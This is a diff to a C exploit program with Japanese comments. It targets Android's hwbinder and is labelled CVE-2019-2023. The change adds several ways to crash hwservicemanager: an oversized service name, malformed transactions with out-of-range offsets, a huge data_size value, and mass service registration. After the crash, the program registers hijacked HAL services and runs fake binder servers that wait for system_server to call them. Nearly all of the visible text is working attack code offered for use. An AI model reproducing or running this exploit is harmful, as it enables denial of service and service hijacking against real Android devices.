@@ -29,10 +29,11 @@ static void dump_hex(FILE *fp, const uint8_t *data, size_t len);
 static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data);
 static int write_file(const char *path, const char *data);
 static pid_t get_hwservicemanager_pid(void);
-static int overflow_hwservicemanager(void);
+static int crash_hwservicemanager(void);
 static int exploit_cve_2019_2023(const char *service_name);
 static int binder_server_loop(int binder_fd, int expected_handle);
 static void register_and_serve(const char *service_name);
+static int send_malformed_transaction(void);
 
 // ============================================================
 // 設定
@@ -41,7 +42,7 @@ static void register_and_serve(const char *service_name);
 #define LOG_FILE       "/data/local/tmp/binder_traffic.log"
 #define SHELL_PATH     "/system/bin/sh"
 
-// 乗っ取り対象サービスリスト（system_server が頻繁に要求するもの）
+// 乗っ取り対象サービスリスト
 static const char *target_services[] = {
     "vendor.qti.hardware.servicetracker@1.0::IServicetracker/default",
     "android.hardware.power@1.0::IPower/default",
@@ -103,7 +104,7 @@ static pid_t get_hwservicemanager_pid(void) {
 }
 
 // ============================================================
-// CVE-2019-2023 レース付きサービス登録
+// CVE-2019-2023 基本登録（レース付き）
 // ============================================================
 static int exploit_cve_2019_2023(const char *service_name) {
     int hwbinder_fd, ret;
@@ -223,30 +224,128 @@ static int exploit_cve_2019_2023(const char *service_name) {
 }
 
 // ============================================================
-// オーバーフロー攻撃（hwservicemanager クラッシュ）
+// 異常なトランザクションを送信（クラッシュ誘発）
 // ============================================================
-static int overflow_hwservicemanager(void) {
-    printf("[*] Attempting heap overflow to crash hwservicemanager...\n");
-    char *payload = malloc(8192);
-    if (!payload) return -1;
-    memset(payload, 'A', 8191);
-    payload[8191] = '\0';
-    int ret = exploit_cve_2019_2023(payload);
-    free(payload);
-    if (ret >= 0) {
-        printf("  [+] Overflow payload sent.\n");
-        sleep(2);
-        pid_t new_pid = get_hwservicemanager_pid();
-        if (new_pid != g_hwservicemanager_pid) {
-            printf("  [+] hwservicemanager crashed! New PID: %d\n", new_pid);
-            g_hwservicemanager_pid = new_pid;
-            return 0;
-        } else {
-            printf("  [-] hwservicemanager did not crash (still PID %d)\n", g_hwservicemanager_pid);
-            return -1;
-        }
+static int send_malformed_transaction(void) {
+    printf("[*] Sending malformed transaction to crash hwservicemanager...\n");
+    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) {
+        perror("  open /dev/hwbinder");
+        return -1;
     }
-    return -1;
+
+    // 巨大なデータ（8KB）に無効なオフセットを仕込む
+    uint8_t *data = malloc(8192);
+    if (!data) { close(hwbinder_fd); return -1; }
+    memset(data, 'A', 8192);
+
+    // オフセット配列: データサイズを超えるオフセットを指定
+    binder_size_t offsets[10];
+    for (int i = 0; i < 10; i++) {
+        offsets[i] = 8192 + i * 8; // データ範囲外
+    }
+
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+    } __attribute__((packed)) tx;
+    tx.cmd = BC_TRANSACTION;
+    tx.tdata.target.handle = 0;
+    tx.tdata.code = 2;
+    tx.tdata.flags = 0;
+    tx.tdata.data_size = 8192;
+    tx.tdata.offsets_size = sizeof(offsets);
+    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
+    tx.tdata.data.ptr.offsets = (binder_uintptr_t)offsets;
+
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = 4096;
+    bwr.read_buffer = (binder_uintptr_t)malloc(4096);
+    if (!bwr.read_buffer) { free(data); close(hwbinder_fd); return -1; }
+
+    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+    free(data);
+    free((void*)bwr.read_buffer);
+    close(hwbinder_fd);
+
+    if (ret < 0) {
+        perror("  malformed transaction");
+        return -1;
+    }
+    printf("  [+] Malformed transaction sent (may have crashed).\n");
+    return 0;
+}
+
+// ============================================================
+// 連続クラッシュ攻撃
+// ============================================================
+static int crash_hwservicemanager(void) {
+    printf("[*] Attempting multiple crash vectors...\n");
+
+    // 1. 巨大サービス名
+    char *payload = malloc(8192);
+    if (payload) {
+        memset(payload, 'A', 8191);
+        payload[8191] = '\0';
+        exploit_cve_2019_2023(payload);
+        free(payload);
+        sleep(1);
+    }
+
+    // 2. 異常なオフセット
+    send_malformed_transaction();
+    sleep(1);
+
+    // 3. 極端に大きな data_size（オーバーフロー）
+    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd >= 0) {
+        struct {
+            uint32_t cmd;
+            struct binder_transaction_data tdata;
+        } __attribute__((packed)) tx;
+        tx.cmd = BC_TRANSACTION;
+        tx.tdata.target.handle = 0;
+        tx.tdata.code = 2;
+        tx.tdata.flags = 0;
+        tx.tdata.data_size = 0xFFFFFFFF; // 巨大
+        tx.tdata.offsets_size = 0;
+        tx.tdata.data.ptr.buffer = 0;
+        tx.tdata.data.ptr.offsets = 0;
+
+        struct binder_write_read bwr;
+        memset(&bwr, 0, sizeof(bwr));
+        bwr.write_size = sizeof(tx);
+        bwr.write_buffer = (binder_uintptr_t)&tx;
+        bwr.read_size = 4096;
+        bwr.read_buffer = (binder_uintptr_t)malloc(4096);
+        if (bwr.read_buffer) {
+            ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+            free((void*)bwr.read_buffer);
+        }
+        close(hwbinder_fd);
+        sleep(1);
+    }
+
+    // 4. リソース枯渇（サービスを大量登録）
+    for (int i = 0; i < 100; i++) {
+        char name[64];
+        snprintf(name, sizeof(name), "overflow_%d", i);
+        exploit_cve_2019_2023(name);
+    }
+
+    // クラッシュを確認
+    pid_t new_pid = get_hwservicemanager_pid();
+    if (new_pid != g_hwservicemanager_pid && new_pid > 0) {
+        printf("[+] hwservicemanager crashed and restarted! New PID: %d\n", new_pid);
+        g_hwservicemanager_pid = new_pid;
+        return 0;
+    } else {
+        printf("[-] hwservicemanager did not crash (still PID %d)\n", g_hwservicemanager_pid);
+        return -1;
+    }
 }
 
 // ============================================================
@@ -281,7 +380,7 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
         uint8_t *payload = read_buf + sizeof(uint32_t);
         size_t payload_size = bwr.read_consumed - sizeof(uint32_t);
 
-        // BR_NOOP (0x720c) は無視
+        // BR_NOOP は無視
         if (cmd_code == 0x720c) {
             fprintf(stderr, "[SERVER] BR_NOOP ignored.\n");
             continue;
@@ -358,7 +457,7 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
 }
 
 // ============================================================
-// サービス登録 + サーバー起動（fork してバックグラウンド化）
+// サービス登録 + サーバー起動
 // ============================================================
 static void register_and_serve(const char *service_name) {
     int handle = exploit_cve_2019_2023(service_name);
@@ -374,7 +473,6 @@ static void register_and_serve(const char *service_name) {
         return;
     }
 
-    // BC_ENTER_LOOPER を送信
     uint32_t cmd = BC_ENTER_LOOPER;
     struct binder_write_read bwr;
     memset(&bwr, 0, sizeof(bwr));
@@ -388,12 +486,11 @@ static void register_and_serve(const char *service_name) {
 
     pid_t pid = fork();
     if (pid == 0) {
-        // 子プロセスでサーバーループ実行
         binder_server_loop(binder_fd, handle);
         exit(0);
     } else if (pid > 0) {
         printf("[+] Binder server for '%s' running (PID %d)\n", service_name, pid);
-        close(binder_fd); // 親は不要なので閉じる
+        close(binder_fd);
     } else {
         perror("  fork server");
         close(binder_fd);
@@ -405,10 +502,10 @@ static void register_and_serve(const char *service_name) {
 // ============================================================
 int main(void) {
     printf("============================================================\n");
-    printf("  CVE-2019-2023 Multi-Service Hijack + System Server Trap\n");
+    printf("  CVE-2019-2023 Final - Multi-Crash + Service Hijack\n");
     printf("============================================================\n\n");
 
-    // ログファイル初期化
+    // ログ初期化
     FILE *fp = fopen(LOG_FILE, "w");
     if (fp) {
         fprintf(fp, "=== Binder Traffic Log ===\n");
@@ -424,28 +521,45 @@ int main(void) {
         printf("[+] Current hwservicemanager PID: %d\n", g_hwservicemanager_pid);
     }
 
-    // 1. オーバーフローを試行（hwservicemanager クラッシュ & 再起動）
-    printf("[*] Phase 1: Overflow hwservicemanager (optional)\n");
-    for (int i = 0; i < 3; i++) {
-        if (overflow_hwservicemanager() == 0) break;
+    // フェーズ1: クラッシュ攻撃（最大5回試行）
+    printf("[*] Phase 1: Crash hwservicemanager with multiple vectors\n");
+    int crashed = 0;
+    for (int i = 0; i < 5 && !crashed; i++) {
+        if (crash_hwservicemanager() == 0) {
+            crashed = 1;
+        }
         sleep(2);
     }
-    // 再起動を少し待つ
-    sleep(3);
-
-    // 2. 全ターゲットサービスを登録し、それぞれにサーバーを起動
-    printf("[*] Phase 2: Register all target services and start servers\n");
-    for (int i = 0; target_services[i] != NULL; i++) {
-        register_and_serve(target_services[i]);
-        usleep(300000); // 少し間隔を空ける
+    if (!crashed) {
+        printf("[-] Failed to crash hwservicemanager. Continuing anyway...\n");
     }
 
-    // 3. 長時間待機（system_server からの呼び出しを待つ）
-    printf("[*] Phase 3: Waiting for system_server to call any of our services...\n");
+    // フェーズ2: 再起動待ち（PID 変更を監視）
+    printf("[*] Phase 2: Wait for hwservicemanager restart\n");
+    int max_wait = 30;
+    while (max_wait-- > 0) {
+        pid_t new_pid = get_hwservicemanager_pid();
+        if (new_pid > 0 && new_pid != g_hwservicemanager_pid) {
+            printf("[+] hwservicemanager restarted with PID: %d\n", new_pid);
+            g_hwservicemanager_pid = new_pid;
+            break;
+        }
+        sleep(1);
+    }
+
+    // フェーズ3: 全サービス再登録 & サーバー起動
+    printf("[*] Phase 3: Register all services and start servers\n");
+    for (int i = 0; target_services[i] != NULL; i++) {
+        register_and_serve(target_services[i]);
+        usleep(300000);
+    }
+
+    // フェーズ4: 長時間待機（system_server からの呼び出しを待つ）
+    printf("[*] Phase 4: Waiting for system_server to call...\n");
     printf("[*] Running for 180 seconds. Check %s for logs.\n", LOG_FILE);
     sleep(180);
 
-    // 4. 結果表示
+    // 結果表示
     printf("\n[*] Log file content:\n");
     system("cat " LOG_FILE " 2>/dev/null || echo 'No log file found'");
 
@@ -453,7 +567,7 @@ int main(void) {
         printf("[+] Exploit succeeded! Check %s\n", OUTPUT_FILE);
     } else {
         printf("[-] No transaction from system_server received.\n");
-        printf("[-] Try manually triggering system events (e.g., screen on/off, charging, etc.)\n");
+        printf("[-] Try manually triggering system events (screen on/off, USB plug, etc.)\n");
     }
 
     printf("\n============================================================\n");
